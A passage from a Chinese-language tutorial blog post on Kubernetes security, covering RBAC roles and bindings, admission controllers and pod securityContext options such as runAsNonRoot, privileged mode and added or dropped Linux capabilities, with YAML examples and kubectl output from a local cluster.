~ % kubectl get pod -n kube-system</span><br><span class="line">NAME                                     READY   STATUS    RESTARTS   AGE</span><br><span class="line">coredns-558bd4d5db-fpmvp                 1/1     Running   6          18d</span><br><span class="line">coredns-558bd4d5db-m8zcd                 1/1     Running   6          18d</span><br><span class="line">etcd-docker-desktop                      1/1     Running   6          18d</span><br><span class="line">kube-apiserver-docker-desktop            1/1     Running   7          18d</span><br><span class="line">kube-controller-manager-docker-desktop   1/1     Running   6          18d</span><br><span class="line">kube-proxy-zw8fj                         1/1     Running   6          18d</span><br><span class="line">kube-scheduler-docker-desktop            1/1     Running   52         18d</span><br><span class="line">storage-provisioner                      1/1     Running   56         18d</span><br><span class="line">vpnkit-controller                        1/1     Running   1034       18d</span><br></pre></td></tr></table></figure><p>之后进入名为<code>kube-proxy-zw8fj</code>的pod中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kubectl exec -it kube-proxy-zw8fj -n kube-system -- /bin/sh</span><br></pre></td></tr></table></figure><p>进入到挂载目录并查看token的详细信息</p><p><img src="/2021/10/25/Kubernetes安全/2.png" alt="2"></p><h4 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h4><p>在认证过程中，只是通信双方确认了对方是可信的，并且可以相互通信，而鉴权是确定请求方有哪些资源的权限，<code>API Server</code>目前支持以下几种授权策略（通过<code>API Server</code>的启动参数<code>--authorization-mode</code>设置）</p><ul><li>AlwaysDeny：表示拒绝所有的请求，一般用于测试</li><li>AlwaysAllow：允许接收所有请求，如果集群不需要授权流程，则可以采用该策略</li><li>ABAC(Attribute-Based Access Control)：基于属性的访问控制，表示使用用户配置的授权规则对用户请求进行匹配和控制</li><li>Webhook：通过调用外部REST服务对用户进行授权</li><li>RBAC(ROle-Based Access Control)：基于角色的访问控制，现行默认规则</li></ul><h5 id="RBAC授权模式"><a href="#RBAC授权模式" class="headerlink" title="RBAC授权模式"></a>RBAC授权模式</h5><p>RBAC在Kubernetes1.5中引入，现行版本成为默认标准，相对其他访问控制方式，拥有以下优势</p><ul><li>对集群中的资源和非资源均拥有完整的覆盖</li><li>整个RBAC完全由几个API对象完成，同其他API对象一样，可以用<code>kubectl</code>或API进行操作</li><li>可以在运行时进行调整，无需重启<code>API Server</code></li></ul><p>RBAC的API资源对象说明</p><p>RBAC引入了4个新的顶级资源对象：<code>Role</code>、<code>ClusterRole</code>、<code>RoleBinding</code>、<code>ClusterRoleBinding</code>。四种对象类型均可以通过<code>kubectl</code>与API操作。部分关系如下图所示</p><p><img src="/2021/10/25/Kubernetes安全/3.png" alt="3"></p><p>需要注意的是Kubernetes并不会提供用户管理，对于User、Group、ServiceAccount指定的用户，Kubernetes组件(kubectl、kube-proxy)或是其他自定义的用户在向CA申请证书时，需要提供一个证书请求文件。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"CN"</span>:<span class="string">"admin"</span>,</span><br><span class="line">  <span class="attr">"hosts"</span>:[],</span><br><span class="line">  <span class="attr">"key"</span>:&#123;</span><br><span class="line">    <span class="attr">"algo"</span>:<span class="string">"rsa"</span>,</span><br><span class="line">    <span class="attr">"size"</span>:<span class="number">2048</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">"names"</span>:[</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">"C"</span>:<span class="string">"CN"</span>,</span><br><span class="line">      <span class="attr">"ST"</span>:<span class="string">"Hangzhou"</span>,</span><br><span class="line">      <span class="attr">"L"</span>:<span class="string">"XS"</span>,</span><br><span class="line">      <span class="attr">"O"</span>:<span class="string">"system:masters"</span>,</span><br><span class="line">      <span class="attr">"OU"</span>:<span class="string">"System"</span></span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>API Server</code>会把客户端证书的<code>CN</code>字段作为User，把<code>names.O</code>字段作为Group</p><p><code>kubelet</code>使用<code>TLS Bootstrapping</code>认证时，<code>API Server</code>可以使用<code>Bootstrap Tokens</code>或者<code>Token authentication file</code>验证token，无论哪一种，Kubernetes都会为token绑定一个默认的User和Group。Pod使用<code>ServiceAccount</code>认证时，<code>service-account-token</code>中的JWT会保存User信息，有了用户信息，再创建一对角色/角色绑定(集群角色/集群角色绑定)资源对象，就可以完成权限绑定了。</p><h5 id="Role-and-ClusterRole"><a href="#Role-and-ClusterRole" class="headerlink" title="Role and ClusterRole"></a>Role and ClusterRole</h5><p>在RBAC API中，Role表示一组规则权限，权限只会增加(累加权限)，不存在一个资源一开始就有很多权限而通过RBAC对其进行减少的操作，Role可以定义在一个namespace中，如果想要跨namespace则可以创建ClusterRole</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> <span class="string">[""]</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">["pods"]</span></span><br><span class="line">  <span class="attr">verbs:</span> <span class="string">["get","watch","list"]</span></span><br></pre></td></tr></table></figure><p>ClusterRole具有和Role相同的权限角色控制能力，不同的是，ClusterRole是集群级别的，可以用于</p><ul><li>集群级别的资源控制（例如node访问权限）</li><li>非资源型 endpoints（例如<code>/healthz</code>访问）</li><li>所有命名空间资源控制（例如pods）</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line"><span class="attr">rules:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">apiGroups:</span> <span class="string">[""]</span></span><br><span class="line">  <span class="attr">resources:</span> <span class="string">["secrets"]</span></span><br><span class="line">  <span class="attr">verbs:</span> <span class="string">["get","watch","list"]</span></span><br></pre></td></tr></table></figure><h5 id="RoleBinding-and-ClusterRoleBinding"><a href="#RoleBinding-and-ClusterRoleBinding" class="headerlink" title="RoleBinding and ClusterRoleBinding"></a>RoleBinding and ClusterRoleBinding</h5><p>RoleBinding可以将角色中定义的权限授予用户或用户组，RoleBinding包含一组权限列表(subjects)，权限列表中包含有不同形式的待授予权限资源类型(users,groups,service accounts)，RoleBinding同样包含对被Bind的Role引用，RoleBinding适用于某个命名空间内授权，而ClusterRoleBinding适用于集群范围内的授权。</p><p>例如，要将default命名空间的<code>pod-reader</code> Role授予elssm用户，此后elssm用户在default命名空间将具有<code>pod-reader</code>的权限</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-pods</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">elssm</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">Role</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-reader</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><p>RoleBinding同样可以引用ClusterRole来对当前namespace内用户、用户组或ServiceAccount进行授权，这种操作允许集群管理员在整个集群内定义一些通用的ClusterRole，然后在不同的namespace中使用RoleBinding来引用。</p><p>例如，以下RoleBinding引用了一个ClusterRole，这个ClusterRole具有整个集群内对secrets的访问权限，但是其授权用户<code>warry</code>只能访问development空间中的secrets（因为RoleBinding定义在development命名空间）</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">RoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-secrets</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">development</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">User</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">warry</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><p>除此以外，还可以使用ClusterRoleBinding对整个集群中的所有命名空间资源权限进行授权，以下ClusterRoleBinding例子展示了授权manager组内所有用户在全部命名空间中对secrets进行访问</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">kind:</span> <span class="string">ClusterRoleBinding</span></span><br><span class="line"><span class="attr">apiVersion:</span> <span class="string">rbac.authorization.k8s.io/v1beta1</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">read-secrets-global</span></span><br><span class="line"><span class="attr">subjects:</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">kind:</span> <span class="string">Group</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">manager</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br><span class="line"><span class="attr">roleRef:</span></span><br><span class="line">  <span class="attr">kind:</span> <span class="string">ClusterRole</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">secret-reader</span></span><br><span class="line">  <span class="attr">apiGroup:</span> <span class="string">rbac.authorization.k8s.io</span></span><br></pre></td></tr></table></figure><h4 id="Admission-Controll"><a href="#Admission-Controll" class="headerlink" title="Admission Controll"></a>Admission Controll</h4><p>准入控制是<code>API Server</code>的插件集合，通过添加不同的插件，实现额外的准入控制规则，甚至于<code>API Server</code>的一些主要的功能都需要通过<code>Admission Controllers</code>，比如ServiceAccount</p><p>一些插件的功能</p><ul><li>Namespace Lifecycle：防止在不存在的namespace上创建对象，防止删除系统预置的namespace</li><li>LimitRanger：确保请求的资源不会超过所在namespace的LimitRange的限制</li><li>Service Account：实现了自动化添加ServiceAccount</li><li>ResourceQuota：确保请求的资源不会超过资源的ResourceQuota限制</li></ul><h4 id="配置节点的安全上下文"><a href="#配置节点的安全上下文" class="headerlink" title="配置节点的安全上下文"></a>配置节点的安全上下文</h4><p>我们可以在Pod或其所属容器的描述中通过security-Context选项配置其他与安全性相关的特性，这个选项可以适用于整个pod，或者每个pod中单独的容器。</p><p>配置安全上下文可以使我们完成很多事情，例如</p><ul><li>指定容器中运行进程的用户(用户ID)</li><li>阻止容器使用root用户运行</li><li>使用特权模式运行容器，使其对宿主节点的内核具有完全的访问权限</li><li>通过添加或禁用内核功能，配置细粒度的内核访问权限</li><li>设置SELinux(安全增强型Linux)选项，加强对容器的限制</li><li>阻止进程写入容器的根文件系统</li></ul><h5 id="运行没有配置安全上下文的pod"><a href="#运行没有配置安全上下文的pod" class="headerlink" title="运行没有配置安全上下文的pod"></a>运行没有配置安全上下文的pod</h5><p>创建一个名为<code>pod-with-defaults</code>的YAML文件，内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-with-defaults</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br></pre></td></tr></table></figure><p>启动pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl create -f pod-with-defaults.yaml </span><br><span class="line">pod/pod-with-defaults created</span><br></pre></td></tr></table></figure><p>查看这个容器中的用户ID和组ID以及它所属的用户组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl exec pod-with-defaults -- id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)</span><br></pre></td></tr></table></figure><p>发现这个容器在用户ID(uid)为0的用户，用户组ID(gid)为0的用户组下运行，它同样还属于一些其他的用户组。</p><h5 id="运行指定用户的pod"><a href="#运行指定用户的pod" class="headerlink" title="运行指定用户的pod"></a>运行指定用户的pod</h5><p>为了使用一个与镜像中不同的用户ID来运行pod，需要设置该pod的<code>securityContext.runAsUser</code>选项，可以通过以下代码来运行一个使用guest用户运行的容器。</p><p>创建一个名为<code>pod-as-user-guest</code>的YAML文件，内容如下，其中id405对应guest用户</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-as-user-guest</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">runAsUser:</span> <span class="number">405</span></span><br></pre></td></tr></table></figure><p>启动pod后查看，发现该容器在guest用户下运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % kubectl exec pod-as-user-guest -- id</span><br><span class="line">uid=405(guest) gid=100(users)</span><br></pre></td></tr></table></figure><h5 id="阻止容器以root用户运行"><a href="#阻止容器以root用户运行" class="headerlink" title="阻止容器以root用户运行"></a>阻止容器以root用户运行</h5><p>创建一个名为<code>pod-run-as-non-root</code>的YAML文件，内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-run-as-non-root</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">runAsNonRoot:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>启动pod后查看pod信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl get pod pod-run-as-non-root     </span><br><span class="line">NAME                  READY   STATUS                       RESTARTS   AGE</span><br><span class="line">pod-run-as-non-root   0/1     CreateContainerConfigError   0          5m16s</span><br></pre></td></tr></table></figure><p>发现pod并没有运行，通过describe查看具体信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl describe pod pod-run-as-non-root      </span><br><span class="line">Name:         pod-run-as-non-root</span><br><span class="line">Namespace:    default</span><br><span class="line">Priority:     0</span><br><span class="line">Node:         docker-desktop/192.168.65.4</span><br><span class="line">Start Time:   Tue, 26 Oct 2021 13:53:32 +0800</span><br><span class="line">Labels:       &lt;none&gt;</span><br><span class="line">Annotations:  &lt;none&gt;</span><br><span class="line">Status:       Pending</span><br><span class="line">node.kubernetes.io/unreachable:NoExecute op=Exists for 300s</span><br><span class="line">Error: container has runAsNonRoot and image will run as root (pod: "pod-run-as-non-root_default", container: main)</span><br></pre></td></tr></table></figure><h5 id="运行使用特权模式的pod"><a href="#运行使用特权模式的pod" class="headerlink" title="运行使用特权模式的pod"></a>运行使用特权模式的pod</h5><p>为了获取宿主机内核的完整权限，该pod需要在特权模式下运行，这可以通过将容器的<code>securityContext</code>中的<code>privileged</code>设置为<code>true</code>实现。</p><p>创建一个名为<code>pod-privileged</code>的YAML文件，内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-privileged</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">privileged:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>部署好这个pod之后，我们与之前部署的非特权模式的pod做对比。</p><p>首先使用之前的名为<code>pod-with-defaults</code>的pod，通过列出<code>/dev</code>目录下文件的方式查看非特权模式容器中的设备，如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-defaults -- ls /dev</span><br><span class="line">core</span><br><span class="line">fd</span><br><span class="line">full</span><br><span class="line">mqueue</span><br><span class="line">null</span><br><span class="line">ptmx</span><br><span class="line">pts</span><br><span class="line">random</span><br><span class="line">shm</span><br><span class="line">stderr</span><br><span class="line">stdin</span><br><span class="line">stdout</span><br><span class="line">termination-log</span><br><span class="line">tty</span><br><span class="line">urandom</span><br><span class="line">zero</span><br></pre></td></tr></table></figure><p>接下来我们列出特权模式容器<code>/dev</code>目录下的文件，可以发现，特权模式的pod可以看到宿主节点上的所有设备。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-privileged -- ls /dev</span><br><span class="line">cachefiles</span><br><span class="line">core</span><br><span class="line">cpu</span><br><span class="line">cpu_dma_latency</span><br><span class="line">cuse</span><br><span class="line">fd</span><br><span class="line">full</span><br><span class="line">fuse</span><br><span class="line">hpet</span><br><span class="line">hwrng</span><br><span class="line">input</span><br><span class="line">kmsg</span><br><span class="line">loop-control</span><br><span class="line">loop0</span><br><span class="line">loop1</span><br><span class="line">loop2</span><br><span class="line">loop3</span><br><span class="line">loop4</span><br><span class="line">loop5</span><br><span class="line">loop6</span><br><span class="line">loop7</span><br><span class="line">mapper</span><br><span class="line">mem</span><br><span class="line">mqueue</span><br><span class="line">nbd0</span><br><span class="line">nbd1</span><br><span class="line">nbd10</span><br><span class="line">nbd11</span><br><span class="line">nbd2</span><br><span class="line">nbd3</span><br><span class="line">nbd4</span><br><span class="line">nbd5</span><br><span class="line">net</span><br><span class="line">null</span><br><span class="line">nvram</span><br><span class="line">port</span><br><span class="line">psaux</span><br><span class="line">ptmx</span><br><span class="line">pts</span><br><span class="line">ram0</span><br><span class="line">ram1</span><br><span class="line">ram10</span><br><span class="line">ram2</span><br><span class="line">ram3</span><br><span class="line">ram4</span><br><span class="line">ram5</span><br><span class="line">tty11</span><br><span class="line">tty12</span><br><span class="line">tty13</span><br><span class="line">tty14</span><br><span class="line">tty15</span><br><span class="line">tty16</span><br><span class="line">tty17</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h5 id="为容器单独添加内核功能"><a href="#为容器单独添加内核功能" class="headerlink" title="为容器单独添加内核功能"></a>为容器单独添加内核功能</h5><p>相比于让容器运行在特权模式下以给予其无限的权限，一个更安全的做法是只给予它是用真正需要的内核功能的权限，Kubernetes允许为特定的容器添加内核功能，或禁用部分内核功能，以允许对容器进行更加精细的权限控制，从而限制攻击之恶潜在侵入的一些影响。</p><p>例如，一个容器通常不允许修改系统时间，我们可以通过修改名为<code>pod-with-defaults</code>的pod中的时间来验证。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-defaults -- date +%T -s "12:00:00"</span><br><span class="line">date: can't set date: Operation not permitted</span><br></pre></td></tr></table></figure><p>如果需要允许容器修改系统时间，可以在容器的<code>securityContext.capabilities</code>里add一项名为<code>CAP_SYS_TIME</code>的功能。</p><p>首先创建一个名为<code>pod-add-settime-capability</code>的YAML文件，内容如下。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-add-settime-capability</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">containers:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">main</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">alpine</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">["/bin/sleep","999999"]</span></span><br><span class="line">    <span class="attr">securityContext:</span></span><br><span class="line">      <span class="attr">capabilities:</span></span><br><span class="line">        <span class="attr">add:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="string">SYS_TIME</span></span><br></pre></td></tr></table></figure><p>注意Linux内核功能的名称通常以<code>CAP_</code>开头，但是在<code>pod spec</code>中指定内核功能时，必须省略<code>CAP_</code>前缀</p><p>启动好pod之后，在新的容器中运行同样的命令，发现可以成功修改系统时间</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-add-settime-capability -- date +%T -s "12:00:00" </span><br><span class="line">12:00:00</span><br><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-add-settime-capability -- date                  </span><br><span class="line">Tue Oct 26 12:00:05 UTC 2021</span><br></pre></td></tr></table></figure><h5 id="在容器中禁用内核功能"><a href="#在容器中禁用内核功能" class="headerlink" title="在容器中禁用内核功能"></a>在容器中禁用内核功能</h5><p>默认情况下，容器拥有<code>CAP_CHOWN</code>权限，允许进程修改文件系统中文件的所有者。如下示例，可以在<code>pod-with-defaults</code>中将<code>/tmp</code>目录的所有者改为guest用户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-defaults -- chown guest /tmp</span><br><span class="line">caoyifan@MacBookPro DockerTest % kubectl exec pod-with-defaults -- ls -la / | grep tmp</span><br><span class="line">drwxrwxrwt    1 guest    root          4096 Aug 27 11:05 